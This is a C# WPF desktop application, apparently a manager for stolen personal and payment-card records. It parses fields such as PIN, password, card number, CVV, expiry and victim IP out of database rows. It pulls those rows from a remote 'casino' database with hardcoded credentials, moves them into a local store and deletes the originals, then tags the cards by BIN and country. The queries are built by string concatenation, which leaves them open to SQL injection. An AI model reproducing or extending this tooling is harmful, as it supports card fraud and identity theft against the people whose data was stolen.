using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows;
using System.Data.SqlClient;
using System.Text.RegularExpressions;
using System.Windows.Controls;
using System.Data.SqlTypes;
using Microsoft.Win32;
using Telerik.Windows.Controls;
using System.ComponentModel;
using System.Windows.Threading;
using System.Net;
using System.Text;

namespace Umetzu
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private string user, pass;

        private readonly Personas lista;

        public MainWindow()
        {
            InitializeComponent();
            lista = FindResource("PersonasDataSource") as Personas;
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            if (ValidateLogin() == -1)
            {
                return;
            }

            LoadData();
        }

        private int ValidateLogin()
        {
            var loginWindow = new Login();
            loginWindow.WindowStartupLocation = System.Windows.WindowStartupLocation.CenterScreen;
            var loginResult = loginWindow.ShowDialog();

            if (loginResult.HasValue && loginResult.Value)
            {
                user = loginWindow.textBox1.Text;
                pass = loginWindow.textBox2.Password;
                return 0;
            }
            else
            {
                Close();
                return -1;
            }
        }

        void BackgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            using (var con = new SqlConnection(string.Format("Data Source=.;Initial Catalog=umetzu_db;user={0};password={1};Persist Security Info=True;", user, pass)))
            {
                var com = con.CreateCommand();
                com.CommandText = "Select valor, mensaje, estado, id, nivel, ccpais, fecha from tabla";
                con.Open();
                var reader = com.ExecuteReader(System.Data.CommandBehavior.CloseConnection);

                int errores = 0;
                PersonasComparer personasComprarer = new PersonasComparer();

                while (reader.Read())
                {
                    bool appErrorHappened = false;

                    var fecha0 = DateTime.Now;
                    DateTime? fecha = null;
                    if (DateTime.TryParse(reader[6] + "", out fecha0))
                    {
                        fecha = fecha0;
                    }

                    try
                    {
                        string cadena = reader.GetString(0);
                        if (cadena.StartsWith("pin:"))
                        {
                            string pinFull = Regex.Split(cadena, "pin:")[1];
                            string nameFull = Regex.Split(pinFull, "name:")[1];
                            string streetFull = Regex.Split(nameFull, "street:")[1];
                            string cityFull = Regex.Split(streetFull, "city:")[1];
                            string provinceFull = Regex.Split(cityFull, "province:")[1];
                            string pCodeFull = Regex.Split(provinceFull, "pcode:")[1];
                            string countryFull = Regex.Split(pCodeFull, "country:")[1];
                            string phoneFull = Regex.Split(countryFull, "phone:")[1];
                            string emailFull = Regex.Split(phoneFull, "email:")[1];
                            string passFull = Regex.Split(emailFull, "pass:")[1];
                            string appFull = "";

                            var appFullTemp = Regex.Split(passFull, "app:");

                            if (appFullTemp.Length > 1)
                            {
                                appFull = appFullTemp[1];
                            }
                            else
                            {
                                appErrorHappened = true;
                                appFull = Regex.Split(passFull, "pp:")[1];
                            }

                            string cardFull = Regex.Split(appFull, "card:")[1];
                            string cardtypeFull = Regex.Split(cardFull, "cardtype:")[1];
                            string cvvFull = Regex.Split(cardtypeFull, "cvv:")[1];
                            string expireFull = Regex.Split(cvvFull, "expire:")[1];
                            string amountFull = Regex.Split(expireFull, "amount:")[1];

                            if (!string.IsNullOrEmpty(Regex.Split(cardFull, "cardtype:")[0]))
                            { 
                                int id = int.Parse(reader[3] + "");

                                var p = new Persona
                                {
                                    pin = Regex.Split(pinFull, "name:")[0],
                                    name = Regex.Split(nameFull, "street:")[0],
                                    street = Regex.Split(streetFull, "city:")[0],
                                    city = Regex.Split(cityFull, "province:")[0],
                                    province = Regex.Split(provinceFull, "pcode:")[0],
                                    pCode = Regex.Split(pCodeFull, "country:")[0],
                                    country = Regex.Split(countryFull, "phone:")[0],
                                    phone = Regex.Split(phoneFull, "email:")[0],
                                    email = Regex.Split(emailFull, "pass:")[0],
                                    pass = Regex.Split(passFull, appErrorHappened ? "pp:" : "app:")[0],
                                    app = Regex.Split(appFull, "card:")[0],
                                    card = Regex.Split(cardFull, "cardtype:")[0],
                                    cardtype = Regex.Split(cardtypeFull, "cvv:")[0],
                                    cvv = Regex.Split(cvvFull, "expire:")[0],
                                    expire = Regex.Split(expireFull, "amount:")[0],
                                    amount = Regex.Split(amountFull, "ip:")[0],
                                    ip = Regex.Split(amountFull, "ip:")[1],
                                    Mensaje = reader[1] + "",
                                    Estado = !string.IsNullOrEmpty(reader[2] + "") && string.Compare(reader[2] + "", "True", false) == 0 ? true : false,
                                    id = id,
                                    Nivel = reader[4] + "",
                                    CCPais = reader[5] + "",
                                    fecha = fecha
                                };
                                var arrayExpire = p.expire.Split('/');

                                if (arrayExpire.Count() == 2)
                                {
                                    p.expire = arrayExpire[1] + "/" + arrayExpire[0];
                                }

                                p.PropertyChanged += p_PropertyChanged;

                                Dispatcher.Invoke((Action)(() =>
                                    {
                                        if (!lista.Contains(p, personasComprarer))
                                        {
                                            lista.Add(p);
                                        }                                        
                                    }), DispatcherPriority.DataBind, null);
                            }
                        }
                    }
                    catch (Exception) { errores++; }
                }

                e.Result = errores;
            }
        }

        void BackgroundWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            Title = string.Format("Umetzu : {0} errores, {1} registros", e.Result, lista.Count);
        }

        private void LoadData()
        {
            using (var backgroundWorker = new BackgroundWorker())
            {
                backgroundWorker.DoWork += BackgroundWorker_DoWork;
                backgroundWorker.RunWorkerCompleted += BackgroundWorker_RunWorkerCompleted;
                backgroundWorker.RunWorkerAsync();
            }
        }

        void p_PropertyChanged(object sender, PropertyChangedEventArgs e)
        {
            var p = sender as Persona;
            string columna, valor;

            string query = "";
            string propertyName = e.PropertyName + "";

            switch (propertyName)
            {
                case "CCPais":
                    columna = "ccpais";
                    valor = p.CCPais;
                    break;
                case "Nivel":
                    columna = "nivel";
                    valor = p.Nivel;
                    break;
                case "Mensaje":
                    columna = "mensaje";
                    valor = p.Mensaje;
                    break;
                default:
                    return;
            }

            if (propertyName == "Mensaje")
            {
                query = string.Format("update tabla set {0} = '{1}' where id = {2}", columna, valor, p.id);
            }
            else
            {
                string bin = p.card.Substring(0, 6);

                query = string.Format("update tabla set {0} = '{1}' where valor like '%{2}%'", columna, valor, bin);

                foreach (var y in lista.Where(x => x.card.StartsWith(bin)))
                {
                    if (propertyName == "Nivel")
                    {
                        y.Nivel = valor;
                    }
                    else
                    {
                        y.CCPais = valor;
                    }
                }
            }

            using (var con = new SqlConnection(string.Format("Data Source=.;Initial Catalog=umetzu_db;user={0};password={1};Persist Security Info=True;", user, pass)))
            {
                try
                {
                    var com = con.CreateCommand();
                    com.CommandText = query;
                    con.Open();
                    com.ExecuteNonQuery();
                    con.Close();
                }
                catch (Exception ex) { MessageBox.Show(string.Format("Problemas al salvar:  {0}", ex.Message)); }
            }          
        }
        
        private void button2_Click(object sender, RoutedEventArgs e)
        {
            lista.Clear();
            LoadData();
        }

        private void button3_Click(object sender, RoutedEventArgs e)
        {
            var fila = new List<LaTabla>();

            using (var con = new SqlConnection("Data Source=casinoval.dyndns.org,1533;Initial Catalog=casino_db;user=casino_user;password=casino1;Persist Security Info=True;"))
            {
                var com = con.CreateCommand();
                com.CommandText = "Select id, valor, mensaje, fecha from tabla";
                con.Open();
                var reader = com.ExecuteReader(System.Data.CommandBehavior.CloseConnection);

                while (reader.Read())
                {
                    var x = new LaTabla
                    {
                        id = reader[0] + "",
                        valor = reader[1] + "",
                        mensaje = reader[2] + "",
                    };

                    var t = SqlDateTime.MinValue.Value;

                    if (DateTime.TryParse(reader[3] + "", out t))
                    {
                        x.fecha = t;
                    }

                    fila.Add(x);

                }
                con.Close();
            }

            if (fila.Count > 0)
            {
                using (var con = new SqlConnection(string.Format("Data Source=.;Initial Catalog=umetzu_db;user={0};password={1};Persist Security Info=True;", user, pass)))
                {
                    var com = con.CreateCommand();
                    con.Open();
                    int i = 0;

                    var con2 = new SqlConnection("Data Source=casinoval.dyndns.org,1533;Initial Catalog=casino_db;user=casino_user;password=casino1;Persist Security Info=True;");
                    var com2 = con2.CreateCommand();
                    con2.Open();

                    List<string> listaId = new List<string>();

                    fila.ForEach(x =>
                    {
                        try
                        {
                            com.CommandText = string.Format("insert into tabla values ('{0}', '{1}', '{2}', '{3}', '{4}', '{5}')", x.valor.Replace("'", ""), x.mensaje.Replace("'", ""), "0", x.fecha.ToString("yyyy-MM-dd HH:mm:ss"), "0", "");
                            if (com.ExecuteNonQuery() == 1)
                            {
                                listaId.Add(x.id);
                            }
                        }
                        catch (Exception)
                        {
                            i++;
                        }
                    });

                    StringBuilder sb = new StringBuilder();

                    foreach (var id in listaId)
                    {
                        sb.Append(id + ",");
                    }

                    com2.CommandText = string.Format("delete from tabla where id in ({0} -1)", sb.ToString());
                    com2.ExecuteNonQuery();

                    con2.Close();                    

                    Title = string.Format("Umetzu : {0} errores", i);
                    con.Close();
                }
            }
        }

        private void ButtonCopy_Click(object sender, RoutedEventArgs e)
        {
            Clipboard.SetText((sender as Button).Content + "");
        }

        private void ButtonCopy_Click2(object sender, RoutedEventArgs e)
        {
            var persona = radGridView1.SelectedItem as Persona;

            Captcha c = new Captcha();
            c.Owner = this;
            c.WindowStartupLocation = System.Windows.WindowStartupLocation.CenterOwner;
            c.binCode = persona.card.Substring(0, 6);
            c.ShowDialog();            

            if (c.valor != "0")
            {
                persona.Nivel = c.valor;
            }

            if (!string.IsNullOrEmpty(c.country))
            {
                persona.CCPais = c.country;
            }
        }

        private void ButtonCopy_Click3(object sender, RoutedEventArgs e)
        {
            var persona = radGridView1.SelectedItem as Persona;

            persona.Mensaje = string.Format("{0} -- ", GetGeoIP(persona.ip).ToUpper()) + persona.Mensaje;
        }

        private string GetGeoIP(string ip)
        {
            string country = "";

            using (WebClient c = new WebClient())
            {
                try
                {
                    country = c.DownloadString("http://geoip.wtanaka.com/cc/" + ip);
                }
                catch (Exception) { }                
            }

            return country;
        }

        private void button1_Click(object sender, RoutedEventArgs e)
        {
            const string extension = "csv";

            var dialog = new SaveFileDialog()
                        {
                            DefaultExt = extension,
                            Filter = String.Format("{1} files (*.{0})|*.{0}|All files (*.*)|*.*", extension, "Excel"),
                            FilterIndex = 1
                        };

            if (dialog.ShowDialog() == true)
            {
                using (var stream = dialog.OpenFile())
                {
                    radGridView1.Export(stream,
                     new GridViewExportOptions()
                     {
                         Format = ExportFormat.Csv,
                         ShowColumnHeaders = false,
                         ShowColumnFooters = false,
                         ShowGroupFooters = false,
                     });
                }   
            }
        }

        private void radGridView1_Grouped(object sender, GridViewGroupedEventArgs e)
        {
            if (radGridView1.Items != null && radGridView1.Items.Groups != null)
            {
                Title = string.Format("Umetzu: {0} grupos, {1} registros", radGridView1.Items.Groups.Count, lista.Count);
            }
        }


    }
}
